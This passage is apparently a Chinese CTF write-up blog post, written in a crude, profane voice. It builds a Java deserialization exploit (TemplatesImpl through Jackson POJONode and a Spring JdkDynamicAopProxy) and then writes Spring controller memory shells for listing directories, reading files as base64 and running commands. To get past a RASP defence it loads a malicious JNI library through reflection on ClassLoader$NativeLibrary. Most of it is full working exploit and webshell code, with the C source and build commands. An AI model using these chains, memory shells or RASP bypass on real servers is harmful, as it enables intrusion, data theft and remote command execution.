获取顺序是根据地址的大小来排序的，期间存在内存 free 的动作，那地址是不会一直线性变化的，之所以不按照字母排序，主要还是为了速度考虑，根据地址排序是最快的。 是反射 getDeclaredMethods 获取到方法的顺序是不确定的，最终导致执行相关 getter 方法的顺序也是不确定的，当 TemplatesImpl 的 getStylesheetDOM 方法先于 getOutputProperties 方法执行时就会导致空指针异常从而导致调用链报错中断，exp 利用失败。 解决方法😊 org.springframework.aop.framework.JdkDynamicAopProxy 解决问题 实现 众所周知，java 有个 b 玩意叫做 动态代理 ，很 nb,👴只在 cc 中用过，不清楚. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package org.example;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class Test &#123; public static void main(String[] args) &#123; Object myProxy = Proxy.newProxyInstance(TestProxy.class.getClassLoader(), new Class[]&#123;TestInterface1.class, TestInterface2.class&#125;, new MyHandler()); for(Method m: myProxy.getClass().getDeclaredMethods()) &#123; System.out.println(m.getName()); &#125; &#125;&#125;interface TestInterface1 &#123; public void say();&#125;interface TestInterface2 &#123; public void test();&#125;class TestProxy &#123; public void eat() &#123; System.out.println(&quot;eat something&quot;); &#125; public void say() &#123; System.out.println(&quot;say something&quot;); &#125; public String getName(String a) &#123; return a; &#125;&#125;class MyHandler implements InvocationHandler &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;invoke dynamic proxy handler&quot;); return null; &#125;&#125; 这是执行结果，可以看懂能获取到的方法，完全取决于接口实现了哪些方法 而 javax.xml.transform.Templates 接口其只有 newTransformer 和 getOutputProperties 这个两个方法，让他作为我们代理所需的接口，这样最终通过 getDeclaredMethods 获取到的方法就只有 newTransformer 和 getOutputProperties 了，那么最终获得的 getter 方法便只有 getOutputProperties 了。 因此只需要挂代理，就只会获取接口方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package org.example;import javax.xml.transform.Templates;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class Test &#123; public static void main(String[] args) &#123; Object myProxy = Proxy.newProxyInstance(TestProxy.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, new MyHandler()); for(Method m: myProxy.getClass().getDeclaredMethods()) &#123; System.out.println(m.getName()); &#125; &#125;&#125;interface TestInterface1 &#123; public void say();&#125;interface TestInterface2 &#123; public void test();&#125;class TestProxy &#123; public void eat() &#123; System.out.println(&quot;eat something&quot;); &#125; public void say() &#123; System.out.println(&quot;say something&quot;); &#125; public String getName(String a) &#123; return a; &#125;&#125;class MyHandler implements InvocationHandler &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;invoke dynamic proxy handler&quot;); return null; &#125;&#125; 这两个方法是 Templates 里面定义的接口方法 JdkDynamicAopProxy 是 Spring 框架中的一个类，它实现了 JDK 动态代理机制，用于创建代理对象来实现面向切面编程（AOP）的功能。 这里能够控制 advised 这里会触发反射方法，这里 advised 前面说过了可控 我们将所需的 TemplatesImpl 的对象用 org.springframework.aop.framework.AdvisedSupport 封装即可 1234Object oldProxy = null; boolean setProxyContext = false; TargetSource targetSource = this.advised.targetSource; Object target = null; 构造 12345678Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);cons.setAccessible(true);AdvisedSupport advisedSupport = new AdvisedSupport();advisedSupport.setTarget(templatesImpl);InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);POJONode jsonNodes = new POJONode(proxyObj); 👴の最後のエクスプロイト 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.fasterxml.jackson.databind.node.BaseJsonNode;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;public class exp &#123; public static void main(String[] args)throws Exception&#123;// ClassPool classPool = ClassPool.getDefault();// CtClass ctClass = classPool.get(evilref.class.getName());// CtClass superClass = classPool.get(AbstractTranslet.class.getName());// ctClass.setSuperclass(superClass);//// CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);//// constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;);//// ctClass.addConstructor(constructor); //byte[][] codes = new byte[][]&#123;code&#125;; TemplatesImpl templates = new TemplatesImpl(); ref(templates, &quot;_bytecodes&quot;, new byte[][]&#123;&#125;); ref(templates, &quot;_name&quot;, &quot;shanghe&quot;); ref(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); POJONode jsonNodes = new POJONode(templates); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(exp,jsonNodes); serialize_func.serialize(exp); WriteToFileExample(serialize_func.encryptToBase64(&quot;ser.bin&quot;)); &#125; public static void WriteToFileExample(String args) &#123; String content = &quot;这是要写入文件的字符串内容&quot;; try &#123; BufferedWriter writer = new BufferedWriter(new FileWriter(&quot;output.txt&quot;)); writer.write(args); writer.close(); System.out.println(&quot;字符串已成功写入文件。&quot;); &#125; catch (IOException e) &#123; System.out.println(&quot;写入文件时发生错误：&quot; + e.getMessage()); &#125; &#125; public static void ref(Object obj,String field,Object value) throws NoSuchFieldException, IllegalAccessException &#123; Field reffield = obj.getClass().getDeclaredField(field); reffield.setAccessible(true); reffield.set(obj,value); &#125; public static String serial(Object o) throws IOException, NoSuchFieldException&#123; ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(o); oos.close(); String base64String = Base64.getEncoder().encodeToString(baos.toByteArray()); return base64String; &#125; public static void deserial(String data) throws Exception &#123; byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); &#125;&#125; 内存🐎的使用🥵👴 捏麻麻滴，太复杂了，还要写个内存马找到 RASP, 还好👴技高一筹. 列目录 nm, 跟喝大了一样，整这 b 玩意，艹😡 首先来一个递归列出所有目录文件的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exls extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exls.class.getMethod(&quot;ls&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls&quot;).options(config).build(); exls readfile_inject = new exls(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls(HttpServletRequest request,HttpServletResponse response) throws IOException &#123; String rootDirectory = request.getParameter(&quot;dir&quot;); // 替换为你的根目录路径 listFilesAndDirectories(new File(rootDirectory),response); response.getWriter().flush(); &#125; public static void listFilesAndDirectories(File directory,HttpServletResponse response) throws IOException &#123; File[] files = directory.listFiles(); if (files != null) &#123; for (File file : files) &#123; if (file.isFile()) &#123; response.getWriter().write(&quot;File: &quot; + file.getAbsolutePath()); &#125; else if (file.isDirectory()) &#123; response.getWriter().write(&quot;Directory: &quot; + file.getAbsolutePath()); listFilesAndDirectories(file,response); // 递归遍历子目录 &#125; &#125; &#125; &#125; &#125; 这样的缺点是列出根目录的时候太多杂碎的东西，👴看不动，要不是👴知道 /home 下面有东西，这玩意太难找了. 优化一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exls extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exls.class.getMethod(&quot;ls1&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls1&quot;).options(config).build(); exls readfile_inject = new exls(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls1(HttpServletRequest request,HttpServletResponse response) throws IOException &#123; String rootDirectory = request.getParameter(&quot;dir&quot;); // 替换为你的根目录路径 listFilesAndDirectories(new File(rootDirectory),response); response.getWriter().flush(); &#125; public static void listFilesAndDirectories(File directory,HttpServletResponse response) throws IOException &#123; File[] files = directory.listFiles(); if (files != null) &#123; for (File file : files) &#123; if (file!=null) &#123; response.getWriter().write(file.getAbsolutePath()+&quot;\\r\\n&quot;); &#125; &#125; &#125; &#125; &#125; 这样看起来舒服多了，👴很中意😊 读文件 👴想尝试柏璐杯的代码，直接通过 ResponseEntity 下载文件，很可惜，失败了，但是涉及到二进制文件的读取，怎么办，👴用 base64 读出来，👴真 tm 是完美天才的 idol (bushi) 终于👴想明白了一件事，写出了内存🐎 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exre extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exre.class.getMethod(&quot;readfile2&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/readfile2&quot;).options(config).build(); exre readfile_inject = new exre(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public void readfile2(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String filePath = request.getParameter(&quot;filepath&quot;); if(filePath!=null)&#123; FileInputStream fileInputStream = new FileInputStream(filePath); byte[] fileBytes = new byte[fileInputStream.available()]; fileInputStream.read(fileBytes); fileInputStream.close(); String base64String = Base64.getEncoder().encodeToString(fileBytes); response.getWriter().write(base64String); response.getWriter().flush(); &#125; &#125;&#125; 什么，你说你不会 base64 转成二进制文件？🤣 自己写个脚本转换都行，👴告诉你，还能上 cyberchef 转换，还能导出为文件😅 RASP😅😡 绕过 content-length 就简单了？8 可能！ nmb 甚至有 RASP,√Ⅷ,👴没学过. 啥事 RASP 在 2012 年的时候，Gartner 引入了 Runtime application self-protection 一词，简称为 RASP。它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。 RASP 技术可以快速的将安全防御功能整合到正在运行的应用程序中，它拦截从应用程序到系统的所有调用，确保它们是安全的，并直接在应用程序内验证数据请求。Web 和非 Web 应用程序都可以通过 RASP 进行保护。该技术不会影响应用程序的设计，因为 RASP 的检测和保护功能是在应用程序运行的系统上运行的。 👴说人话：就是 nm 把内存过滤，实时动态防护。别人叫内存马，你叫内存盾. 至于这玩意，👴就不在这里赘述了，先等👴新开个文章，记录一下 RASP 的学习笔记. 👴回来了，到了最后的步骤了., 看👴绕过这该死的 RASP. 通过 java-agent 插桩技术，hook 住了一些底层的类，使得 java 的 exec 不能够执行 一般是 unix 或这 forkandexec forkAndExec 通常是与操作系统进程管理相关的操作，用于在类 Unix 操作系统中（如 Linux）创建子进程并在子进程中执行指定的程序。 可恶的 RASP hook 住了这些类 甚至还不让本地 JNI 加载了， loadLibrary0 也被 hook 了 解决方案😒 底层的 native 方法 java.lang.ClassLoader.NativeLibrary#load 并未被 hook，并且反射也是可以正常使用的，所以可以尝试使用反射来调用 java.lang.ClassLoader.NativeLibrary 中的 load 方法来加载恶意 so 文件执行命令 船新姿势之 javah 可以，我就喜欢 h😊 javah 是 Java 开发工具包 (JDK) 提供的一个命令行工具，用于生成 Java 类的本地方法接口 (Native Method Interface, JNI) 头文件。JNI 允许 Java 代码与本地（通常是 C 或 C++）代码进行交互，这在某些情况下非常有用，例如与硬件交互或与现有的本地库进行集成。 编写包含本地方法声明的 Java 类，使用 native 关键字声明本地方法。 123public class EvilClass &#123; public static native String execCmd(String cmd);&#125; 然后使用 javac 编译成 class, 然后使用 javah 编译成 h 文件 12javah -jni EvilClass 生成的 EvilClass.h 如下 12345678910111213141516171819202122/* DO NOT EDIT THIS FILE - it is machine generated */#include &lt;jni.h&gt;/* Header for class EvilClass */#ifndef _Included_EvilClass#define _Included_EvilClass#ifdef __cplusplusextern &quot;C&quot; &#123;#endif/* * Class: EvilClass * Method: execCmd * Signature: (Ljava/lang/String;)Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_EvilClass_execCmd (JNIEnv *, jclass, jstring);#ifdef __cplusplus&#125;#endif#endif 接下来还要根据这个 h 文件写 C 文件，nm👴不会 c 1234567891011121314151617int execmd(const char *cmd, char *result)&#123; char buffer[1024*12]; //定义缓冲区 FILE *pipe = popen(cmd, &quot;r&quot;); //打开管道，并执行命令 if (!pipe) return 0; //返回0表示运行失败 while (!feof(pipe)) &#123; if (fgets(buffer, 128, pipe)) &#123; //将管道输出到result中 strcat(result, buffer); &#125; &#125; pclose(pipe); //关闭管道 return 1; //返回1表示运行成功&#125; 这里开启了一个缓冲区， popen 是 C 中执行命令时打开的一个管道，以只读模式打开。如果为空，则命令执行失败，返回. 同时 while 使用 feof 检测 pipe 状态，未结束就持续从 pipe 里面每次最大获取 128 个字节内容，放到缓冲区，然后将结果追加到 result 中. 随后 123456789101112131415161718JNIEXPORT jstring JNICALL Java_EvilClass_execCmd(JNIEnv *env, jclass class_object, jstring jstr)&#123; const char *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, NULL); // 获取 Java 字符串 jstr 的 UTF-8 编码 char result[1024 * 12] = &quot;&quot;; // 定义一个存放命令执行结果的字符数组 if (1 == execmd(cstr, result)) // 调用之前定义的 execmd 函数来执行系统命令 &#123; // 如果命令执行成功，你可以在这里进行一些处理，但代码中被注释掉了 &#125; char return_messge[100] = &quot;&quot;; // 定义一个存放返回消息的字符数组 strcat(return_messge, result); // 将命令执行结果追加到返回消息 jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge); // 创建一个 Java 字符串，用于存储返回消息 return cmdresult; // 返回 Java 字符串，包含命令执行结果&#125; JNI 规范 JNI 原型函数： JNI 规范定义了一组标准的 JNI 函数原型，如 GetStringUTFChars 、 ReleaseStringUTFChars 等，以方便操作字符串、数组、引用等常见任务。 JNI 函数命名规范： JNI 函数的命名必须遵循特定的命名规范，通常是 Java 类名（用下划线替代点号）后跟 Java 方法名。例如，Java 类 com.example.MyClass 中的方法 myNativeFunction 对应的 JNI 函数应为 Java_com_example_MyClass_myNativeFunction 。 JNIEnv 指针： JNI 函数的第一个参数是一个 JNIEnv 指针，它是一个关于 JNI 环境的上下文。通过 JNIEnv ，JNI 函数可以访问 Java 虚拟机的各种功能，如对象创建、方法调用和异常处理。 数据类型转换： JNI 定义了各种数据类型的对应关系，以便 Java 和本地代码之间的数据传递。例如，Java 的 int 对应 JNI 的 jint ，Java 的 String 对应 JNI 的 jstring 等。JNI 函数允许在这些数据类型之间进行转换。 从参数上看：它接受三个参数： JNIEnv *env （JNI 环境指针）、 jclass class_object （表示 Java 类的类对象）、 jstring jstr （一个 Java 字符串）。 通过 (*env)-&gt;GetStringUTFChars 函数将 Java 字符串 jstr 转换为 C 字符串 cstr ，这是因为 execmd 函数需要接受 C 字符串作为参数。 中间执行命令，存储. 使用 (*env)-&gt;NewStringUTF 函数创建一个新的 Java 字符串 cmdresult ，用于存储返回消息。 将两部分放在一起，形成 c 文件，然后编译 编译: 12gcc -FPIC -I /home/siroha/java8202/include -I /home/siroha/java8202/include/linux -shared -o libcmd.so ./EvilClass.cbase64 -w 0 libcmd.so &gt; Evil.txt 写文件的操作 1234RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, &quot;rw&quot;); randomAccessFile.write(jniBytes); randomAccessFile.close(); 最终写个 load 的内存🐎 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.RandomAccessFile;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.Vector;public class EvilClass extends AbstractTranslet &#123; public static native String execCmd(String cmd); private static final String EVIL_JNI_BASE64 = &quot;&quot;;//👴就不放在这里了,太长了,自己生成 private static final String LIB_PATH = &quot;/tmp/libcmd.so&quot;; static &#123; try&#123; byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64); RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, &quot;rw&quot;); randomAccessFile.write(jniBytes); randomAccessFile.close(); //调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库 ClassLoader cmdLoader = EvilClass.class.getClassLoader(); Class&lt;?&gt; classLoaderClazz = Class.forName(&quot;java.lang.ClassLoader&quot;); Class&lt;?&gt; nativeLibraryClazz = Class.forName(&quot;java.lang.ClassLoader$NativeLibrary&quot;); Method load = nativeLibraryClazz.getDeclaredMethod(&quot;load&quot;, String.class, boolean.class); load.setAccessible(true); Field field = classLoaderClazz.getDeclaredField(&quot;nativeLibraries&quot;); field.setAccessible(true); Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader); Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class); nativeLibraryCons.setAccessible(true); Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, false); libs.addElement(nativeLibraryObj); field.set(cmdLoader, libs); load.invoke(nativeLibraryObj, LIB_PATH, false); //写入内存马 WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method method2 = EvilClass.class.getMethod(&quot;shell&quot;, HttpServletRequest.class, HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;) .options(config) .build(); EvilClass springControllerMemShell = new EvilClass(); mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String cmd = request.getParameter(&quot;cmd&quot;); if (cmd != null) &#123; String execRes = EvilClass.execCmd(cmd); response.getWriter().write(execRes); response.getWriter().flush(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; NativeLibrary 包装到 Vector,Vector 是 Classloader 中 nativeLibraries 的值， 一般来说用 1234System.loadLibrary(&quot;cmd&quot;); Command command = new Command(); String ipconfig = command.exec(&quot;ipconfig&quot;); System.out.println(ipconfig); 题目 ban 了. 芜湖，真√Ⅷ 爽，√Ⅷ 真爽，终出了. 捏麻麻地，👴花了几天时间，学了一堆东西. 怎么制作链子，怎么 python 发包，👴在前面已经分析过了。不用问了😅","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]}],"categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"https://1llustrious.github.io/tags/WP/"},{"name":"复现","slug":"复现","permalink":"https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]}